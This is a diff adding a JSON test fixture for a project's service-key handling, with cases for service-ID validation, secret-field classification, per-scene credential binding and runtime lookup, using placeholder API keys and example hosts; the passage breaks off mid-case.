@@ -1,0 +1,4422 @@
+{
+  "$comment": "The corpus of docs/service-keys.md. Runners: cloud/apps/auth-web/src/test/shared-spa/service-keys-fixtures.test.ts (frontend/src/utils/serviceKeys.ts), backend/app/utils/tests/test_service_keys.py (app/utils/service_keys.py), frameos/src/frameos/tests/test_service_keys.nim (runtime, inject). Expectations follow repo/services.json as committed.",
+  "serviceId": [
+    {
+      "id": "openAI",
+      "isService": true
+    },
+    {
+      "id": "acmeWeather",
+      "isService": true
+    },
+    {
+      "id": "defaults",
+      "isService": false
+    },
+    {
+      "id": "serviceCredentials",
+      "isService": false
+    },
+    {
+      "id": "ssh_keys",
+      "isService": false
+    },
+    {
+      "id": "k_abcdefgh12",
+      "isService": false
+    },
+    {
+      "id": "1bad",
+      "isService": false
+    },
+    {
+      "id": "has-dash",
+      "isService": false
+    },
+    {
+      "id": "",
+      "isService": false
+    },
+    {
+      "id": "serviceKeys",
+      "isService": false
+    },
+    {
+      "id": "serviceSettings",
+      "isService": false
+    }
+  ],
+  "secrecy": [
+    {
+      "service": "openAI",
+      "field": "apiKey",
+      "secret": true
+    },
+    {
+      "service": "openAI",
+      "field": "backendApiKey",
+      "secret": null
+    },
+    {
+      "service": "homeAssistant",
+      "field": "url",
+      "secret": false
+    },
+    {
+      "service": "homeAssistant",
+      "field": "accessToken",
+      "secret": true
+    },
+    {
+      "service": "homeAssistant",
+      "field": "mqttPassword",
+      "secret": null
+    },
+    {
+      "service": "acmeWeather",
+      "field": "apiKey",
+      "secret": true
+    },
+    {
+      "service": "acmeWeather",
+      "field": "baseUrl",
+      "secret": true
+    }
+  ],
+  "deliverable": [
+    {
+      "name": "registered: registry fields only",
+      "service": "openAI",
+      "stored": {
+        "apiKey": "sk-1",
+        "backendApiKey": "sk-plane",
+        "chatModel": "x"
+      },
+      "values": {
+        "apiKey": "sk-1"
+      }
+    },
+    {
+      "name": "registered: empty values are not keys",
+      "service": "immich",
+      "stored": {
+        "url": "https://p.example.com",
+        "apiKey": ""
+      },
+      "values": {
+        "url": "https://p.example.com"
+      }
+    },
+    {
+      "name": "registered: nothing usable",
+      "service": "unsplash",
+      "stored": {
+        "accessKey": ""
+      },
+      "values": null
+    },
+    {
+      "name": "home assistant: never the MQTT settings",
+      "service": "homeAssistant",
+      "stored": {
+        "url": "http://ha.local:8123",
+        "accessToken": "t",
+        "mqttHost": "m",
+        "mqttPassword": "p",
+        "syncEnabled": true
+      },
+      "values": {
+        "accessToken": "t",
+        "url": "http://ha.local:8123"
+      }
+    },
+    {
+      "name": "unregistered: every string field",
+      "service": "acmeWeather",
+      "stored": {
+        "apiKey": "a",
+        "region": "eu",
+        "retries": 3,
+        "bad-name": "x"
+      },
+      "values": {
+        "apiKey": "a",
+        "region": "eu"
+      }
+    },
+    {
+      "name": "not an object",
+      "service": "openAI",
+      "stored": "sk-1",
+      "values": null
+    }
+  ],
+  "resolve": [
+    {
+      "name": "no binding, not granted: refused",
+      "declared": [
+        "openAI"
+      ],
+      "keys": null,
+      "legacyGranted": [],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "openAI": null
+      }
+    },
+    {
+      "name": "no binding, granted by the older rule: default",
+      "declared": [
+        "openAI",
+        "unsplash"
+      ],
+      "keys": null,
+      "legacyGranted": [
+        "openAI",
+        "unsplash",
+        "immich"
+      ],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "openAI": "default",
+        "unsplash": "default"
+      }
+    },
+    {
+      "name": "the install picks a credential",
+      "declared": [
+        "openAI"
+      ],
+      "keys": {
+        "openAI": "k_work0000001"
+      },
+      "legacyGranted": [],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "openAI": "k_work0000001"
+      }
+    },
+    {
+      "name": "the install refuses what the older grant gave",
+      "declared": [
+        "openAI"
+      ],
+      "keys": {
+        "openAI": null
+      },
+      "legacyGranted": [
+        "openAI"
+      ],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "openAI": null
+      }
+    },
+    {
+      "name": "false refuses too",
+      "declared": [
+        "openAI"
+      ],
+      "keys": {
+        "openAI": false
+      },
+      "legacyGranted": [
+        "openAI"
+      ],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "openAI": null
+      }
+    },
+    {
+      "name": "a removed credential is refused, never swapped",
+      "declared": [
+        "openAI"
+      ],
+      "keys": {
+        "openAI": "k_gone0000001"
+      },
+      "legacyGranted": [
+        "openAI"
+      ],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "openAI": null
+      }
+    },
+    {
+      "name": "another service's credential is refused",
+      "declared": [
+        "openAI"
+      ],
+      "keys": {
+        "openAI": "k_ha00000001"
+      },
+      "legacyGranted": [],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "openAI": null
+      }
+    },
+    {
+      "name": "a binding for a service no app declares is dropped",
+      "declared": [
+        "unsplash"
+      ],
+      "keys": {
+        "openAI": "default",
+        "unsplash": "default"
+      },
+      "legacyGranted": [],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "unsplash": "default"
+      }
+    },
+    {
+      "name": "junk in keys is ignored",
+      "declared": [
+        "openAI"
+      ],
+      "keys": {
+        "openAI": 42,
+        "bad name": "default"
+      },
+      "legacyGranted": [
+        "openAI"
+      ],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "openAI": "default"
+      }
+    },
+    {
+      "name": "declared names that are no service are ignored",
+      "declared": [
+        "openAI",
+        "defaults",
+        "k_abcdefgh12"
+      ],
+      "keys": null,
+      "legacyGranted": [
+        "openAI",
+        "defaults"
+      ],
+      "credentials": {
+        "k_work0000001": {
+          "service": "openAI",
+          "name": "Work",
+          "values": {
+            "apiKey": "sk-work"
+          }
+        },
+        "k_ha00000001": {
+          "service": "homeAssistant",
+          "name": "Cabin",
+          "values": {
+            "url": "https://cabin.example.com",
+            "accessToken": "cabin"
+          }
+        }
+      },
+      "bindings": {
+        "openAI": "default"
+      }
+    }
+  ],
+  "wire": [
+    {
+      "name": "own scenes on the default, a store scene refused",
+      "scenes": [
+        {
+          "id": "clock",
+          "declared": [],
+          "legacyGranted": []
+        },
+        {
+          "id": "art",
+          "declared": [
+            "openAI"
+          ],
+          "legacyGranted": [
+            "openAI"
+          ]
+        },
+        {
+          "id": "store-art",
+          "declared": [
+            "openAI"
+          ],
+          "legacyGranted": []
+        }
+      ],
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default",
+          "backendApiKey": "sk-plane"
+        },
+        "unsplash": {
+          "accessKey": ""
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token",
+          "mqttPassword": "mqtt"
+        },
+        "acmeWeather": {
+          "apiKey": "acme-1"
+        },
+        "defaults": {
+          "wifiPassword": "never"
+        },
+        "serviceCredentials": {
+          "k_work0000001": {
+            "service": "openAI",
+            "name": "Work",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "k_ha00000001": {
+            "service": "homeAssistant",
+            "name": "Cabin",
+            "values": {
+              "url": "https://cabin.example.com",
+              "accessToken": "cabin"
+            }
+          }
+        }
+      },
+      "expect": {
+        "serviceKeys": {
+          "v": 1,
+          "keys": {
+            "openAI": {
+              "service": "openAI",
+              "values": {
+                "apiKey": "sk-default"
+              }
+            }
+          },
+          "scenes": {
+            "art": {
+              "openAI": "openAI"
+            },
+            "store-art": {
+              "openAI": null
+            }
+          },
+          "services": {
+            "openAI": {
+              "title": "OpenAI",
+              "fields": [
+                {
+                  "name": "apiKey",
+                  "label": "API key"
+                }
+              ],
+              "hosts": [
+                "api.openai.com"
+              ]
+            }
+          }
+        },
+        "settings": {
+          "openAI": {
+            "apiKey": "sk-default"
+          }
+        }
+      }
+    },
+    {
+      "name": "one scene on another key: the default still ships for the rest",
+      "scenes": [
+        {
+          "id": "art",
+          "declared": [
+            "openAI"
+          ],
+          "legacyGranted": [
+            "openAI"
+          ]
+        },
+        {
+          "id": "work-art",
+          "declared": [
+            "openAI"
+          ],
+          "keys": {
+            "openAI": "k_work0000001"
+          },
+          "legacyGranted": [
+            "openAI"
+          ]
+        },
+        {
+          "id": "cabin",
+          "declared": [
+            "homeAssistant"
+          ],
+          "keys": {
+            "homeAssistant": "k_ha00000001"
+          }
+        }
+      ],
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default",
+          "backendApiKey": "sk-plane"
+        },
+        "unsplash": {
+          "accessKey": ""
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token",
+          "mqttPassword": "mqtt"
+        },
+        "acmeWeather": {
+          "apiKey": "acme-1"
+        },
+        "defaults": {
+          "wifiPassword": "never"
+        },
+        "serviceCredentials": {
+          "k_work0000001": {
+            "service": "openAI",
+            "name": "Work",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "k_ha00000001": {
+            "service": "homeAssistant",
+            "name": "Cabin",
+            "values": {
+              "url": "https://cabin.example.com",
+              "accessToken": "cabin"
+            }
+          }
+        }
+      },
+      "expect": {
+        "serviceKeys": {
+          "v": 1,
+          "keys": {
+            "openAI": {
+              "service": "openAI",
+              "values": {
+                "apiKey": "sk-default"
+              }
+            },
+            "k_ha00000001": {
+              "service": "homeAssistant",
+              "values": {
+                "accessToken": "cabin",
+                "url": "https://cabin.example.com"
+              }
+            },
+            "k_work0000001": {
+              "service": "openAI",
+              "values": {
+                "apiKey": "sk-work"
+              }
+            }
+          },
+          "scenes": {
+            "art": {
+              "openAI": "openAI"
+            },
+            "cabin": {
+              "homeAssistant": "k_ha00000001"
+            },
+            "work-art": {
+              "openAI": "k_work0000001"
+            }
+          },
+          "services": {
+            "homeAssistant": {
+              "title": "Home Assistant",
+              "fields": [
+                {
+                  "name": "url",
+                  "label": "Home Assistant URL",
+                  "secret": false
+                },
+                {
+                  "name": "accessToken",
+                  "label": "Access token"
+                }
+              ],
+              "hostsFrom": "url"
+            },
+            "openAI": {
+              "title": "OpenAI",
+              "fields": [
+                {
+                  "name": "apiKey",
+                  "label": "API key"
+                }
+              ],
+              "hosts": [
+                "api.openai.com"
+              ]
+            }
+          }
+        },
+        "settings": {
+          "homeAssistant": {
+            "accessToken": "cabin",
+            "url": "https://cabin.example.com"
+          },
+          "openAI": {
+            "apiKey": "sk-default"
+          }
+        }
+      }
+    },
+    {
+      "name": "a default with no value is named and not shipped",
+      "scenes": [
+        {
+          "id": "photos",
+          "declared": [
+            "unsplash"
+          ],
+          "legacyGranted": [
+            "unsplash"
+          ]
+        }
+      ],
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default",
+          "backendApiKey": "sk-plane"
+        },
+        "unsplash": {
+          "accessKey": ""
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token",
+          "mqttPassword": "mqtt"
+        },
+        "acmeWeather": {
+          "apiKey": "acme-1"
+        },
+        "defaults": {
+          "wifiPassword": "never"
+        },
+        "serviceCredentials": {
+          "k_work0000001": {
+            "service": "openAI",
+            "name": "Work",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "k_ha00000001": {
+            "service": "homeAssistant",
+            "name": "Cabin",
+            "values": {
+              "url": "https://cabin.example.com",
+              "accessToken": "cabin"
+            }
+          }
+        }
+      },
+      "expect": {
+        "serviceKeys": {
+          "v": 1,
+          "keys": {},
+          "scenes": {
+            "photos": {
+              "unsplash": "unsplash"
+            }
+          },
+          "services": {
+            "unsplash": {
+              "title": "Unsplash",
+              "fields": [
+                {
+                  "name": "accessKey",
+                  "label": "Access key"
+                }
+              ],
+              "hosts": [
+                "api.unsplash.com"
+              ]
+            }
+          }
+        },
+        "settings": {}
+      }
+    },
+    {
+      "name": "an unregistered service takes its labels from the app",
+      "scenes": [
+        {
+          "id": "weather",
+          "declared": [
+            "acmeWeather"
+          ],
+          "legacyGranted": [
+            "acmeWeather"
+          ],
+          "appDefinitions": {
+            "acmeWeather": {
+              "id": "acmeWeather",
+              "title": "Acme Weather",
+              "fields": [
+                {
+                  "name": "apiKey",
+                  "label": "API key",
+                  "secret": true
+                }
+              ],
+              "registered": false
+            }
+          }
+        }
+      ],
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default",
+          "backendApiKey": "sk-plane"
+        },
+        "unsplash": {
+          "accessKey": ""
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token",
+          "mqttPassword": "mqtt"
+        },
+        "acmeWeather": {
+          "apiKey": "acme-1"
+        },
+        "defaults": {
+          "wifiPassword": "never"
+        },
+        "serviceCredentials": {
+          "k_work0000001": {
+            "service": "openAI",
+            "name": "Work",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "k_ha00000001": {
+            "service": "homeAssistant",
+            "name": "Cabin",
+            "values": {
+              "url": "https://cabin.example.com",
+              "accessToken": "cabin"
+            }
+          }
+        }
+      },
+      "expect": {
+        "serviceKeys": {
+          "v": 1,
+          "keys": {
+            "acmeWeather": {
+              "service": "acmeWeather",
+              "values": {
+                "apiKey": "acme-1"
+              }
+            }
+          },
+          "scenes": {
+            "weather": {
+              "acmeWeather": "acmeWeather"
+            }
+          },
+          "services": {
+            "acmeWeather": {
+              "title": "Acme Weather",
+              "fields": [
+                {
+                  "name": "apiKey",
+                  "label": "API key"
+                }
+              ]
+            }
+          }
+        },
+        "settings": {
+          "acmeWeather": {
+            "apiKey": "acme-1"
+          }
+        }
+      }
+    },
+    {
+      "name": "only a credential is bound: the older settings carry it",
+      "scenes": [
+        {
+          "id": "work-art",
+          "declared": [
+            "openAI"
+          ],
+          "keys": {
+            "openAI": "k_work0000001"
+          }
+        }
+      ],
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default",
+          "backendApiKey": "sk-plane"
+        },
+        "unsplash": {
+          "accessKey": ""
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token",
+          "mqttPassword": "mqtt"
+        },
+        "acmeWeather": {
+          "apiKey": "acme-1"
+        },
+        "defaults": {
+          "wifiPassword": "never"
+        },
+        "serviceCredentials": {
+          "k_work0000001": {
+            "service": "openAI",
+            "name": "Work",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "k_ha00000001": {
+            "service": "homeAssistant",
+            "name": "Cabin",
+            "values": {
+              "url": "https://cabin.example.com",
+              "accessToken": "cabin"
+            }
+          }
+        }
+      },
+      "expect": {
+        "serviceKeys": {
+          "v": 1,
+          "keys": {
+            "k_work0000001": {
+              "service": "openAI",
+              "values": {
+                "apiKey": "sk-work"
+              }
+            }
+          },
+          "scenes": {
+            "work-art": {
+              "openAI": "k_work0000001"
+            }
+          },
+          "services": {
+            "openAI": {
+              "title": "OpenAI",
+              "fields": [
+                {
+                  "name": "apiKey",
+                  "label": "API key"
+                }
+              ],
+              "hosts": [
+                "api.openai.com"
+              ]
+            }
+          }
+        },
+        "settings": {
+          "openAI": {
+            "apiKey": "sk-work"
+          }
+        }
+      }
+    }
+  ],
+  "runtime": [
+    {
+      "name": "the scene’s own key",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "art",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ],
+      "value": "sk-default"
+    },
+    {
+      "name": "another scene, another key",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "work-art",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ],
+      "value": "sk-work"
+    },
+    {
+      "name": "refused: nothing, though the frame holds a key",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "store-art",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ]
+    },
+    {
+      "name": "a scene not in the map gets nothing",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "on-device",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ]
+    },
+    {
+      "name": "a bound key with no value and no value on the frame: nothing",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "photos",
+      "declared": [
+        "unsplash"
+      ],
+      "path": [
+        "unsplash",
+        "accessKey"
+      ]
+    },
+    {
+      "name": "a bound key the plane has no value for: the frame's own settings (typed on its admin page)",
+      "settings": {
+        "unsplash": {
+          "accessKey": "typed-on-the-pi"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "photos",
+      "declared": [
+        "unsplash"
+      ],
+      "path": [
+        "unsplash",
+        "accessKey"
+      ],
+      "value": "typed-on-the-pi"
+    },
+    {
+      "name": "refused never falls back to the frame's settings",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        }
+      },
+      "serviceKeys": {
+        "v": 1,
+        "keys": {
+          "openAI": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-default"
+            }
+          },
+          "k_work0000001": {
+            "service": "openAI",
+            "values": {
+              "apiKey": "sk-work"
+            }
+          },
+          "homeAssistant": {
+            "service": "homeAssistant",
+            "values": {
+              "url": "http://ha.local:8123",
+              "accessToken": "ha-token"
+            }
+          }
+        },
+        "scenes": {
+          "art": {
+            "openAI": "openAI"
+          },
+          "work-art": {
+            "openAI": "k_work0000001"
+          },
+          "store-art": {
+            "openAI": null
+          },
+          "ha": {
+            "homeAssistant": "homeAssistant"
+          },
+          "photos": {
+            "unsplash": "unsplash"
+          }
+        },
+        "services": {
+          "openAI": {
+            "title": "OpenAI",
+            "fields": [
+              {
+                "name": "apiKey",
+                "label": "API key"
+              }
+            ],
+            "hosts": [
+              "api.openai.com"
+            ]
+          },
+          "homeAssistant": {
+            "title": "Home Assistant",
+            "fields": [
+              {
+                "name": "url",
+                "label": "Home Assistant URL",
+                "secret": false
+              },
+              {
+                "name": "accessToken",
+                "label": "Access token"
+              }
+            ],
+            "hostsFrom": "url"
+          },
+          "unsplash": {
+            "title": "Unsplash",
+            "fields": [
+              {
+                "name": "accessKey",
+                "label": "Access key"
+              }
+            ],
+            "hosts": [
+              "api.unsplash.com"
+            ]
+          }
+        }
+      },
+      "scene": "store-art",
+      "declared": [
+        "openAI"
+      ],
+      "path": [
+        "openAI",
+        "apiKey"
+      ]
+    },
+    {
+      "name": "undeclared: nothing",
+      "settings": {
+        "openAI": {
+          "apiKey": "sk-default"
+        },
+        "homeAssistant": {
+          "url": "http://ha.local:8123",
+          "accessToken": "ha-token"
+        }
+      },
+      "serviceKeys": {
